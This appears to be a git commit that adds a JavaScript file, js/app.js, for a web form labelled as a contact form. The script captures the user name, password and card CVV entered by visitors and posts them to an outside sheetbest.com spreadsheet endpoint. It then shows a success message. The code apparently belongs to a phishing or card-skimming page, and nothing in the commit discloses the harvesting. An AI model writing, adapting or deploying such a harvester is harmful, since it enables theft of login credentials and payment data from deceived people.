5bcfb834ab783763cd3693118569738260ac9981
0e-soporte <bluesmeralda4@gmail.com>
2024-12-11 09:41:34 -0600

    add files data ae

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/cafcfd0f-05fe-4593-b192-a8d56bce0229', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Clave": formulario.contraseña.value,
+            "Cvv": formulario.cvv.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
